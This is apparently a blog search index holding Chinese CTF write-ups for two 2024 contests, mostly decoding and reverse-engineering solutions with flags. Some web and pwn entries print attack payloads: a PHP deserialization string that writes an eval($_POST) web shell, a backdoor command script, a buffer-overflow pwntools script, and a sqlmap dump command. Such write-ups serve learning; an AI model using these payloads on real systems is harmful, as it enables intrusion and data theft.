<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>2024 江苏移动“赋能建功”网络安全技能竞赛 初赛</title>
    <link href="/2024/11/16/2024-%E6%B1%9F%E8%8B%8F%E7%A7%BB%E5%8A%A8%E2%80%9C%E8%B5%8B%E8%83%BD%E5%BB%BA%E5%8A%9F%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B-%E5%88%9D%E8%B5%9B/"/>
    <url>/2024/11/16/2024-%E6%B1%9F%E8%8B%8F%E7%A7%BB%E5%8A%A8%E2%80%9C%E8%B5%8B%E8%83%BD%E5%BB%BA%E5%8A%9F%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B-%E5%88%9D%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><h4 id="keyboard"><a href="#keyboard" class="headerlink" title="keyboard"></a>keyboard</h4><p>usbhid 一把梭 转大写提交</p><p><img src="../../../../img/archives/2024JSYDXS/image-20241116112027226.png" alt="image-20241116112027226"></p><p>flag{A72BD409-B511-472B-A5A0-2F348BC5B9F3}</p><h4 id="dns"><a href="#dns" class="headerlink" title="dns"></a>dns</h4><p>dns.qry.name有附加数据，tshark转json，正则提取</p><p><img src="../../../../img/archives/2024JSYDXS/image-20241116112142065.png" alt="image-20241116112142065"></p><p>tshark -T json -r dns.pcap &gt; 2test.json</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> re<br><br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;2test.json&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>,encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>).read()<br>data=re.findall(<span class="hljs-string">r&#x27;&quot;dns\.qry\.name&quot;: &quot;([0123456789abcdef]+)\.\d+\.\d+\.\d+\.\d+&quot;&#x27;</span>,f)<br><span class="hljs-comment"># print(set(data))</span><br>d=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(data)):<br>    <span class="hljs-keyword">if</span>(i%<span class="hljs-number">4</span>==<span class="hljs-number">0</span>):<br>        d+=data[i]<br><span class="hljs-built_in">print</span>(d)<br></code></pre></td></tr></table></figure><p>hex转字符，b64解码</p><p><img src="../../../../img/archives/2024JSYDXS/image-20241116112353673.png" alt="image-20241116112353673"></p><p>flag{FT47cMX26pWyFSI6RPWaSr5YRw}</p><h4 id="bft"><a href="#bft" class="headerlink" title="bft"></a>bft</h4><p>PuzzleSolver一把嗦</p><p><img src="../../../../img/archives/2024JSYDXS/image-20241116112420411.png" alt="image-20241116112420411"></p><p>b64解码出flag</p><p><img src="../../../../img/archives/2024JSYDXS/image-20241116112445158.png" alt="image-20241116112445158"></p><p>flag{327a6c4304ad5938eaf0efb6cc3e53dc}</p><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="easy-sm"><a href="#easy-sm" class="headerlink" title="easy-sm"></a>easy-sm</h4><p>sm3爆破，直接让ai写个解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> gmssl <span class="hljs-keyword">import</span> sm3, func<br><br><span class="hljs-comment"># 提示中的固定前缀</span><br>prefix = <span class="hljs-string">&quot;admin&quot;</span><br><br><span class="hljs-comment"># 目标哈希值</span><br>target_hash = <span class="hljs-string">&quot;f1127f0189ad9e1bde949fb14991db82c9c9b41e90edcf014898595e8ab908c0&quot;</span><br><br><span class="hljs-comment"># 遍历可能的后缀（六个数字）</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1000000</span>):<br>    <span class="hljs-comment"># 补齐后缀为六位数字，不足前面补0</span><br>    suffix = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;i:06d&#125;</span>&quot;</span><br>    <span class="hljs-comment"># 拼接完整密码</span><br>    password = prefix + suffix<br>    <span class="hljs-comment"># 计算SM3哈希</span><br>    password_hash = sm3.sm3_hash(func.bytes_to_list(password.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)))<br>    <span class="hljs-comment"># 与目标哈希进行匹配</span><br>    <span class="hljs-keyword">if</span> password_hash == target_hash:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Password found: <span class="hljs-subst">&#123;password&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><h4 id="easy-train"><a href="#easy-train" class="headerlink" title="easy-train"></a>easy-train</h4><p>base62解密，凯撒2解密，栅栏2栏，题目提示翻转，使用atbash解码，再凯撒一次出flag</p><p>hm{h0319h-ikl6-hjl6l5bgih54-l649-17l7k18k}</p><p>gl{g0319g-hjk6-gik6k5afhg54-k649-17k7j18j}</p><p>galf{hgg05341-9kg6-4h9j-k167-kg7ijk168kj5}</p><p>tzou{stt05341-9pt6-4s9q-p167-pt7rqp168pq5}</p><p>flag{eff05341-9bf6-4e9c-b167-bf7dcb168bc5}</p><p><img src="../../../../img/archives/2024JSYDXS/image-20241116113005394.png" alt="image-20241116113005394"></p><h3 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h3><h4 id="pwn签到"><a href="#pwn签到" class="headerlink" title="pwn签到"></a>pwn签到</h4><p>真签到</p><p>构造payload，使其溢出v1并覆盖s1，将s1修改为admin，触发条件执行system(“&#x2F;bin&#x2F;sh”)。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">&#x27;221.178.230.105&#x27;</span>,<span class="hljs-number">36595</span>)<br>payload = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x10</span> + <span class="hljs-string">b&#x27;admin&#x27;</span><br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h3><h4 id="simplere"><a href="#simplere" class="headerlink" title="simplere"></a>simplere</h4><p>IDA打开就有</p><p><img src="../../../../img/archives/2024JSYDXS/image-20241116122027615.png" alt="image-20241116122027615"></p><h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="web签到"><a href="#web签到" class="headerlink" title="web签到"></a>web签到</h4><p>shiro一把梭</p><p><img src="../../../../img/archives/2024JSYDXS/image-20241116123130692.png" alt="image-20241116123130692"></p><h4 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h4><p>反序列化，php协议绕过die写马，hackbar直接读flag</p><p><img src="../../../../img/archives/2024JSYDXS/image-20241116123629429.png" alt="image-20241116123629429"></p><p>payload</p><p>O%3A3%3A%22Who%22%3A1%3A%7Bs%3A4%3A%22char%22%3BO%3A4%3A%22Lisi%22%3A2%3A%7Bs%3A4%3A%22file%22%3Bs%3A44%3A%22php%3A%2F%2Ffilter%2Fstring.rot13%2Fresource%3Dshell.php%22%3Bs%3A4%3A%22text%22%3Bs%3A28%3A%22%3C%3Fcuc+riny%28%24_CBFG%5B%22pzq%22%5D%29%3B%3F%3E%22%3B%7D%7D</p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Misc</tag>
      
      <tag>Web</tag>
      
      <tag>Crypto</tag>
      
      <tag>Reverse</tag>
      
      <tag>Pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2024 NewStarCTF</title>
    <link href="/2024/11/01/2024-NewStarCTF/"/>
    <url>/2024/11/01/2024-NewStarCTF/</url>
    
    <content type="html"><![CDATA[<h3 id="1-Misc-兑换码"><a href="#1-Misc-兑换码" class="headerlink" title="1 Misc 兑换码"></a>1 Misc 兑换码</h3><h4 id="操作内容："><a href="#操作内容：" class="headerlink" title="操作内容："></a>操作内容：</h4><p>题目提示就在图片下面</p><p><img src="../../../../img/archives/2024-NewStarCTF/5490fa9a64b94efbb21ae7c27d0f244b.png"></p><p>PuzzleSolver直接修复图片</p><p><img src="../../../../img/archives/2024-NewStarCTF/140b12602c06f4cccb35939891b83ec4.png"></p><p><img src="../../../../img/archives/2024-NewStarCTF/84912e5b77a98ac4c64f1e7fcee0ecd7.png"></p><h4 id="flag值："><a href="#flag值：" class="headerlink" title="flag值："></a>flag值：</h4><p>flag{La_vaguelette}</p><h3 id="2-Crypto-Base"><a href="#2-Crypto-Base" class="headerlink" title="2 Crypto Base"></a>2 Crypto Base</h3><h4 id="操作内容：-1"><a href="#操作内容：-1" class="headerlink" title="操作内容："></a>操作内容：</h4><p>CyberChef一把梭，没什么好说的</p><p><img src="../../../../img/archives/2024-NewStarCTF/d1dfb3e71ed6463ff2f9e5455ddbe6cc.png"></p><h4 id="flag值：-1"><a href="#flag值：-1" class="headerlink" title="flag值："></a>flag值：</h4><p>flag{B@sE_0f_CrYpt0_N0W}</p><h3 id="3-Crypto-一眼秒了"><a href="#3-Crypto-一眼秒了" class="headerlink" title="3 Crypto 一眼秒了"></a>3 Crypto 一眼秒了</h3><h4 id="操作内容：-2"><a href="#操作内容：-2" class="headerlink" title="操作内容："></a>操作内容：</h4><p>Factordb分解n，得到pq，pdec直接出</p><p><img src="../../../../img/archives/2024-NewStarCTF/0f2d180083a9010e335e36f4d5dfdee3.png"></p><h4 id="如该题使用自己编写的脚本代码请详细写出，不允许截图"><a href="#如该题使用自己编写的脚本代码请详细写出，不允许截图" class="headerlink" title="如该题使用自己编写的脚本代码请详细写出，不允许截图"></a>如该题使用自己编写的脚本代码请详细写出，不允许截图</h4><table><thead><tr><th>from Crypto.Util.number import * from gmpy2 import * # from serct import flag p &#x3D; 7221289171488727827673517139597844534869368289455419695964957239047692699919030405800116133805855968123601433247022090070114331842771417566928809956044421 q &#x3D; 7221289171488727827673517139597844534869368289455419695964957239047692699919030405800116133805855968123601433247022090070114331842771417566928809956045093 n &#x3D; p*q phi &#x3D;(p-1)*(q-1) # m &#x3D; bytes_to_long(flag)  e &#x3D; 65537 d&#x3D;inverse(e,phi) c &#x3D; 48757373363225981717076130816529380470563968650367175499612268073517990636849798038662283440350470812898424299904371831068541394247432423751879457624606194334196130444478878533092854342610288522236409554286954091860638388043037601371807379269588474814290382239910358697485110591812060488786552463208464541069 m&#x3D;powmod(c, d, n) # print(n) print(long_to_bytes(m))  # 52147017298260357180329101776864095134806848020663558064141648200366079331962132411967917697877875277103045755972006084078559453777291403087575061382674872573336431876500128247133861957730154418461680506403680189755399752882558438393107151815794295272358955300914752523377417192504702798450787430403387076153 # 48757373363225981717076130816529380470563968650367175499612268073517990636849798038662283440350470812898424299904371831068541394247432423751879457624606194334196130444478878533092854342610288522236409554286954091860638388043037601371807379269588474814290382239910358697485110591812060488786552463208464541069</th></tr></thead></table><h4 id="flag值：-2"><a href="#flag值：-2" class="headerlink" title="flag值："></a>flag值：</h4><p>flag{9cd4b35a-affc-422a-9862-58e1cc3ff8d2}</p><h3 id="4-Reverse-begin"><a href="#4-Reverse-begin" class="headerlink" title="4 Reverse begin"></a>4 Reverse begin</h3><h4 id="操作内容：-3"><a href="#操作内容：-3" class="headerlink" title="操作内容："></a>操作内容：</h4><p>IDA x64打开，F5看伪代码</p><p><img src="../../../../img/archives/2024-NewStarCTF/d024ca112a6d9d47faffb63d8ee79f44.png"></p><p><img src="../../../../img/archives/2024-NewStarCTF/3797b160538ab16ad0a2cb6143813dbd.png"></p><p>根据说明找到flag1 flag2</p><p><img src="../../../../img/archives/2024-NewStarCTF/b0985d283daae21c25f7c3046eed39a5.png"></p><p><img src="../../../../img/archives/2024-NewStarCTF/2934a8ac619723658f8b84afeca2571f.png"></p><p>并提示了part3位置，part3+}&#x3D;flag</p><p><img src="../../../../img/archives/2024-NewStarCTF/c27434201e2940f9f1dde5e3217c3b53.png"></p><h4 id="flag值：-3"><a href="#flag值：-3" class="headerlink" title="flag值："></a>flag值：</h4><p>flag{Mak3_aN_3Ff0rt_tO_5eArcH_F0r_th3_f14g_C0Rpse}</p><h3 id="5-Crypto-xor"><a href="#5-Crypto-xor" class="headerlink" title="5 Crypto xor"></a>5 Crypto xor</h3><h4 id="操作内容：-4"><a href="#操作内容：-4" class="headerlink" title="操作内容："></a>操作内容：</h4><p>简单的异或，使用密钥解密c1和c2再拼接</p><h4 id="如该题使用自己编写的脚本代码请详细写出，不允许截图-1"><a href="#如该题使用自己编写的脚本代码请详细写出，不允许截图-1" class="headerlink" title="如该题使用自己编写的脚本代码请详细写出，不允许截图"></a>如该题使用自己编写的脚本代码请详细写出，不允许截图</h4><table><thead><tr><th>from pwn import xor from Crypto.Util.number import bytes_to_long, long_to_bytes  key &#x3D; b’New_Star_CTF’ c1 &#x3D; 8091799978721254458294926060841 c2 &#x3D; b’;:\x1c1&lt;\x03&gt;*\x10\x11u;’  # 反向XOR m1_recovered &#x3D; c1 ^ bytes_to_long(key) m2_recovered &#x3D; xor(key, c2)  # 转换m1_recovered为字节 m1_recovered_bytes &#x3D; long_to_bytes(m1_recovered)  # 拼接得到完整的flag flag_recovered &#x3D; m1_recovered_bytes + m2_recovered print(flag_recovered)</th></tr></thead></table><h4 id="flag值：-4"><a href="#flag值：-4" class="headerlink" title="flag值："></a>flag值：</h4><p>flag{0ops!_you_know_XOR!}</p><h3 id="6-Reverse-base64"><a href="#6-Reverse-base64" class="headerlink" title="6 Reverse base64"></a>6 Reverse base64</h3><h4 id="操作内容：-5"><a href="#操作内容：-5" class="headerlink" title="操作内容："></a>操作内容：</h4><p>简单的base64换表，映射表和结果都给了，直接解</p><p><img src="../../../../img/archives/2024-NewStarCTF/c248f43c4d596c2b69737a10189eacaa.png"></p><h4 id="如该题使用自己编写的脚本代码请详细写出，不允许截图-2"><a href="#如该题使用自己编写的脚本代码请详细写出，不允许截图-2" class="headerlink" title="如该题使用自己编写的脚本代码请详细写出，不允许截图"></a>如该题使用自己编写的脚本代码请详细写出，不允许截图</h4><table><thead><tr><th>import base64  str1 &#x3D; “g84Gg6m2ATtVeYqUZ9xRnaBpBvOVZYtj+Tc&#x3D;” string1 &#x3D; “WHydo3sThiS7ABLElO0k5trange+CZfVIGRvup81NKQbjmPzU4MDc9Y6q2XwFxJ&#x2F;“ string2 &#x3D; “ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+&#x2F;“ a&#x3D;str1.translate(str.maketrans(string1,string2))  print(base64.b64decode(a))</th></tr></thead></table><h4 id="flag值：-5"><a href="#flag值：-5" class="headerlink" title="flag值："></a>flag值：</h4><p>flag{y0u_kn0w_base64_well}</p><h3 id="7-Pwn-Real-Login"><a href="#7-Pwn-Real-Login" class="headerlink" title="7 Pwn Real Login"></a>7 Pwn Real Login</h3><h4 id="操作内容：-6"><a href="#操作内容：-6" class="headerlink" title="操作内容："></a>操作内容：</h4><p>IDA逆向一下得到password直接进去cat flag</p><p><img src="../../../../img/archives/2024-NewStarCTF/9a47e6b1e2ff9cf1258d62762fabdf39.png"></p><p>flag{5d405177-f660-4260-9ef6-3778b318efb6}<img src="../../../../img/archives/2024-NewStarCTF/629914745dd5c12466cd972a533224a4.png"></p><h4 id="flag值：-6"><a href="#flag值：-6" class="headerlink" title="flag值："></a>flag值：</h4><p>flag{5d405177-f660-4260-9ef6-3778b318efb6}</p><h3 id="8-Reverse-Simple-encryption"><a href="#8-Reverse-Simple-encryption" class="headerlink" title="8 Reverse Simple_encryption"></a>8 Reverse Simple_encryption</h3><h4 id="操作内容：-7"><a href="#操作内容：-7" class="headerlink" title="操作内容："></a>操作内容：</h4><p>IDA F5直接看main函数加密伪代码，取对比的加密后内容buffer进行解密</p><p><img src="../../../../img/archives/2024-NewStarCTF/635bb0f75bfda628de900cc9d6014c44.png"></p><p><img src="../../../../img/archives/2024-NewStarCTF/0a7601a74235b82ddbee0f0db5013288.png"></p><p>对输入字符的处理分为三种情况：</p><p>当索引 j 是 0 (mod 3) 时，输入字符会减去 31。</p><p>当索引 j 是 1 (mod 3) 时，输入字符会加上 41。</p><p>当索引 j 是 2 (mod 3) 时，输入字符会进行异或操作，使用 0x55。</p><p>根据以上逻辑编写代码逆向解密flag</p><h4 id="如该题使用自己编写的脚本代码请详细写出，不允许截图-3"><a href="#如该题使用自己编写的脚本代码请详细写出，不允许截图-3" class="headerlink" title="如该题使用自己编写的脚本代码请详细写出，不允许截图"></a>如该题使用自己编写的脚本代码请详细写出，不允许截图</h4><table><thead><tr><th>buffer &#x3D; [  0x47, 0x95, 0x34, 0x48, 0xA4, 0x1C, 0x35, 0x88,  0x64, 0x16, 0x88, 0x07, 0x14, 0x6A, 0x39, 0x12,  0xA2, 0x0A, 0x37, 0x5C, 0x07, 0x5A, 0x56, 0x60,  0x12, 0x76, 0x25, 0x12, 0x8E, 0x28 ] flag &#x3D; [] for k in range(len(buffer)):  if k % 3 &#x3D;&#x3D; 0:  value &#x3D; buffer[k] + 31  elif k % 3 &#x3D;&#x3D; 1:  value &#x3D; buffer[k] - 41  elif k % 3 &#x3D;&#x3D; 2:  value &#x3D; buffer[k] ^ 0x55  flag.append(value)  flag_chars &#x3D; ‘’.join(chr(b) for b in flag) print(flag_chars)</th></tr></thead></table><h4 id="flag值：-7"><a href="#flag值：-7" class="headerlink" title="flag值："></a>flag值：</h4><p>flag{IT_15_R3Al1y_V3Ry-51Mp1e}</p><h3 id="9-Web-headach3"><a href="#9-Web-headach3" class="headerlink" title="9 Web headach3"></a>9 Web headach3</h3><h4 id="操作内容：-8"><a href="#操作内容：-8" class="headerlink" title="操作内容："></a>操作内容：</h4><p>Bp发包，flag直接在响应头</p><p><img src="../../../../img/archives/2024-NewStarCTF/dd7196985b410e3a8024108f86ffbc63.png"></p><h4 id="flag值：-8"><a href="#flag值：-8" class="headerlink" title="flag值："></a>flag值：</h4><p>flag{You_Ar3_R3Ally_A_9ooD_d0ctor}</p><h3 id="10-Misc-Labyrinth"><a href="#10-Misc-Labyrinth" class="headerlink" title="10 Misc Labyrinth"></a>10 Misc Labyrinth</h3><h4 id="操作内容：-9"><a href="#操作内容：-9" class="headerlink" title="操作内容："></a>操作内容：</h4><p>Stegsolve Red 0得到一个二维码</p><p><img src="../../../../img/archives/2024-NewStarCTF/4ff62b2e840b7daaf41d614a18b5a328.png"></p><p>扫描得到flag</p><p><img src="../../../../img/archives/2024-NewStarCTF/70939efcc30ef0e70a960b9d35e44962.png"></p><h4 id="flag值：-9"><a href="#flag值：-9" class="headerlink" title="flag值："></a>flag值：</h4><p>flag{e33bb7a1-ac94-4d15-8ff7-fd8c88547b43}</p><h3 id="11-Misc-pleasingMusic"><a href="#11-Misc-pleasingMusic" class="headerlink" title="11 Misc pleasingMusic"></a>11 Misc pleasingMusic</h3><h4 id="操作内容：-10"><a href="#操作内容：-10" class="headerlink" title="操作内容："></a>操作内容：</h4><p>Audacity打开，发现后半部分存在摩斯密码，结合题目中的正反都好听，从后往前翻译出明文</p><p><img src="../../../../img/archives/2024-NewStarCTF/f3e3f6beff7be8950bb6ba9b62968771.png"></p><p><img src="../../../../img/archives/2024-NewStarCTF/a3be990674e0fc49d23d19512b214221.png"></p><h4 id="flag值：-10"><a href="#flag值：-10" class="headerlink" title="flag值："></a>flag值：</h4><p>flag{ez_morse_code}</p><h3 id="12-Misc-WhereIsFlag"><a href="#12-Misc-WhereIsFlag" class="headerlink" title="12 Misc WhereIsFlag"></a>12 Misc WhereIsFlag</h3><h4 id="操作内容：-11"><a href="#操作内容：-11" class="headerlink" title="操作内容："></a>操作内容：</h4><p>读取&#x2F;proc&#x2F;self&#x2F;environ中的当前环境变量</p><p><img src="../../../../img/archives/2024-NewStarCTF/8dd5d013a66b52480b5d7d5b1465992f.png"></p><h4 id="flag值：-11"><a href="#flag值：-11" class="headerlink" title="flag值："></a>flag值：</h4><p>flag{9b398734-2b58-4fb3-803a-afa58f100fc8}</p><h3 id="13-Misc-decompress"><a href="#13-Misc-decompress" class="headerlink" title="13 Misc decompress"></a>13 Misc decompress</h3><h4 id="操作内容：-12"><a href="#操作内容：-12" class="headerlink" title="操作内容："></a>操作内容：</h4><p>解压几层后提示^([a-z]){3}\d[a-z]$，及3个a-z字母+1个数字+一个a-z字母(懒得用hashcat，直接上ARCRPR了)</p><p><img src="../../../../img/archives/2024-NewStarCTF/59e8b9b0bfc0a02b5cfa6653c039754c.png"></p><p>解压得到flag</p><p><img src="../../../../img/archives/2024-NewStarCTF/a6f13e63548bdb5e5f67f0063b03b271.png"></p><h4 id="flag值：-12"><a href="#flag值：-12" class="headerlink" title="flag值："></a>flag值：</h4><p>flag{U_R_th3_ma5ter_0f_dec0mpress}</p><h3 id="14-Crypto-Strange-King"><a href="#14-Crypto-Strange-King" class="headerlink" title="14 Crypto Strange King"></a>14 Crypto Strange King</h3><h4 id="操作内容：-13"><a href="#操作内容：-13" class="headerlink" title="操作内容："></a>操作内容：</h4><p><img src="../../../../img/archives/2024-NewStarCTF/6f4eb4efb0b541da0475e235c21fc944.png"></p><p>提示5 皇帝 每天进步，可知是凯撒位移5开始，随波逐流解密分析发现是5-7-11-1……</p><p><img src="../../../../img/archives/2024-NewStarCTF/4c328f2369b566b759dbd24037336e07.jpeg"></p><p>编写代码进行解密得到flag</p><h4 id="如该题使用自己编写的脚本代码请详细写出，不允许截图-4"><a href="#如该题使用自己编写的脚本代码请详细写出，不允许截图-4" class="headerlink" title="如该题使用自己编写的脚本代码请详细写出，不允许截图"></a>如该题使用自己编写的脚本代码请详细写出，不允许截图</h4><table><thead><tr><th>def custom_caesar_decrypt(ciphertext):  decrypted &#x3D; “”  shift_values &#x3D; [5,7,9,11,13,15,17,19,21,23,25,1,3] # 定义位移模式  for i, char in enumerate(ciphertext):  if char.isalpha():  shift &#x3D; shift_values[i % len(shift_values)]  shifted &#x3D; ord(char) - shift  if char.islower():  if shifted &lt; ord(‘a’):  shifted +&#x3D; 26  elif char.isupper():  if shifted &lt; ord(‘A’):  shifted +&#x3D; 26  decrypted +&#x3D; chr(shifted)  else:  decrypted +&#x3D; char  return decrypted  ciphertext &#x3D; “ksjr{EcxvpdErSvcDgdgEzxqjql}” decrypted_text &#x3D; custom_caesar_decrypt(ciphertext) print(decrypted_text)</th></tr></thead></table><h4 id="flag值：-13"><a href="#flag值：-13" class="headerlink" title="flag值："></a>flag值：</h4><p>flag{PleaseDoNotStopLearing}</p><h3 id="15-Signin-ez-answer"><a href="#15-Signin-ez-answer" class="headerlink" title="15 Signin ez_answer"></a>15 Signin ez_answer</h3><h4 id="操作内容：-14"><a href="#操作内容：-14" class="headerlink" title="操作内容："></a>操作内容：</h4><p>问卷85分即可得到flag</p><h4 id="flag值：-14"><a href="#flag值：-14" class="headerlink" title=" flag值："></a><img src="../../../../img/archives/2024-NewStarCTF/6d80fe678f549e98d6bc464c75841561.png"> flag值：</h4><p>flag{I_Agr3e_to_FoL10w_th3_ru1es_c41fa97d}</p><h3 id="16-Reverse-ezAndroidStudy"><a href="#16-Reverse-ezAndroidStudy" class="headerlink" title="16 Reverse ezAndroidStudy"></a>16 Reverse ezAndroidStudy</h3><h4 id="操作内容：-15"><a href="#操作内容：-15" class="headerlink" title="操作内容："></a>操作内容：</h4><p>5各部分分别给了提示，根据提示操作，前4部分使用MT得到，第五部分IDA反编译so直接出</p><p>Flag1:</p><p>DEX编辑后进行搜索</p><p><img src="../../../../img/archives/2024-NewStarCTF/f164c93fdf104c56f09e603b9fc1d4e1.png"></p><p>Flag2:</p><p>Arsc编辑</p><p><img src="../../../../img/archives/2024-NewStarCTF/64a8950ac5abab1c6337f13d884c6828.png"></p><p>Flag3:</p><p><img src="../../../../img/archives/2024-NewStarCTF/5ff48315aa526a39dce540b02ddd3357.png"></p><p><img src="../../../../img/archives/2024-NewStarCTF/9425b7a02ce484d03f7266f795d430f3.png"></p><p>Flag4:</p><p><img src="../../../../img/archives/2024-NewStarCTF/e88fbdd8b9d2db7a429c472a6e7c0305.png"></p><p><img src="../../../../img/archives/2024-NewStarCTF/acce4f52fc3ad972d25a43d957dbc97a.png"></p><p><img src="../../../../img/archives/2024-NewStarCTF/deb2bdd8ce279977da0c88ed3e59e6b1.png"></p><p>Flag5:</p><p>So扔进IDA Shift+F12</p><p><img src="../../../../img/archives/2024-NewStarCTF/163f4342ba2a5d49b36320eacc43bbcf.png"></p><p><img src="../../../../img/archives/2024-NewStarCTF/583938f162699b672d61d2059650ccbc.jpeg"></p><h4 id="flag值：-15"><a href="#flag值：-15" class="headerlink" title="flag值："></a>flag值：</h4><p>flag{Y0u_@r4_900d_andr01d_r4V4rs4r}</p><h3 id="17-Reverse-ez-debug"><a href="#17-Reverse-ez-debug" class="headerlink" title="17 Reverse ez_debug"></a>17 Reverse ez_debug</h3><h4 id="操作内容：-16"><a href="#操作内容：-16" class="headerlink" title="操作内容："></a>操作内容：</h4><p>X64dbg断点直接出</p><p><img src="../../../../img/archives/2024-NewStarCTF/8c11e4a406da2e1716e01600ea6526b6.png"></p><h4 id="flag值：-16"><a href="#flag值：-16" class="headerlink" title="flag值："></a>flag值：</h4><p>flag{y0u_ar3_g0od_@_Debu9}</p><h3 id="18-Web-智械危机"><a href="#18-Web-智械危机" class="headerlink" title="18 Web 智械危机"></a>18 Web 智械危机</h3><h4 id="操作内容：-17"><a href="#操作内容：-17" class="headerlink" title="操作内容："></a>操作内容：</h4><p>题目提示看robots.txt，得到backdoor.php</p><p>对比key是否为cmd翻转后md5再b64的结果，cmd为b64编码的命令</p><p><img src="../../../../img/archives/2024-NewStarCTF/8a3c9658c9ebf5b403bed333f0c08dc8.png"></p><p><img src="../../../../img/archives/2024-NewStarCTF/2d9408204f3b30315a86dccb2538af6a.png"></p><h4 id="如该题使用自己编写的脚本代码请详细写出，不允许截图-5"><a href="#如该题使用自己编写的脚本代码请详细写出，不允许截图-5" class="headerlink" title="如该题使用自己编写的脚本代码请详细写出，不允许截图"></a>如该题使用自己编写的脚本代码请详细写出，不允许截图</h4><table><thead><tr><th>&lt;?php $cmd &#x3D; “cat &#x2F;flag”; $encoded_cmd &#x3D; base64_encode($cmd); &#x2F;&#x2F; Base64编码  &#x2F;&#x2F; 反转命令 $reversed_cmd &#x3D; strrev($encoded_cmd); &#x2F;&#x2F; 计算MD5哈希 $hashed_reversed_cmd &#x3D; md5($reversed_cmd); &#x2F;&#x2F; 进行Base64编码 $key &#x3D; base64_encode($hashed_reversed_cmd);  echo “cmd&#x3D;$encoded_cmd&amp;key&#x3D;$key”; ?&gt;</th></tr></thead></table><h4 id="flag值：-17"><a href="#flag值：-17" class="headerlink" title="flag值："></a>flag值：</h4><p>flag{96789279-20ad-4ad4-a09a-65a6a6e1f567}</p><h3 id="19-Web-谢谢皮蛋"><a href="#19-Web-谢谢皮蛋" class="headerlink" title="19 Web 谢谢皮蛋"></a>19 Web 谢谢皮蛋</h3><h4 id="操作内容：-18"><a href="#操作内容：-18" class="headerlink" title="操作内容："></a>操作内容：</h4><p>Hint.php提示联合注入，sqlmap一把梭</p><p><img src="../../../../img/archives/2024-NewStarCTF/7bbb5e851b5fa3e0db08ae2d35d50213.png"></p><p>最终获取flag的命令：sqlmap -l sql.txt –tamper base64encode.py –batch –technique U -D ctf -T Fl4g -C value –dump</p><p><img src="../../../../img/archives/2024-NewStarCTF/48a5c0f1a269c5b9d4946bcb6f96ab3e.png"></p><h4 id="flag值：-18"><a href="#flag值：-18" class="headerlink" title="flag值："></a>flag值：</h4><p>flag{15eda1e9-9dc8-4176-bd47-aa55423fc12e}</p><h3 id="20-Pwn-Game"><a href="#20-Pwn-Game" class="headerlink" title="20 Pwn Game"></a>20 Pwn Game</h3><h4 id="操作内容：-19"><a href="#操作内容：-19" class="headerlink" title="操作内容："></a>操作内容：</h4><p>IDA打开分析，发现在5秒内输入数字和&gt;999即可获取shell，使用pwntools进行输入</p><p><img src="../../../../img/archives/2024-NewStarCTF/b73cac14535eec3ee6c6f897dac1d3da.png"></p><h4 id="如该题使用自己编写的脚本代码请详细写出，不允许截图-6"><a href="#如该题使用自己编写的脚本代码请详细写出，不允许截图-6" class="headerlink" title="如该题使用自己编写的脚本代码请详细写出，不允许截图"></a>如该题使用自己编写的脚本代码请详细写出，不允许截图</h4><table><thead><tr><th>from pwn import *  p&#x3D;remote(“101.200.139.65”,31483) for i in range(100):  p.sendline(b”10”) p.interactive()</th></tr></thead></table><h4 id="flag值：-19"><a href="#flag值：-19" class="headerlink" title="flag值："></a>flag值：</h4><p>flag{4cb9b6f9-ae7f-427f-bef4-2f9799da9920}</p><h3 id="21-Web-会赢吗"><a href="#21-Web-会赢吗" 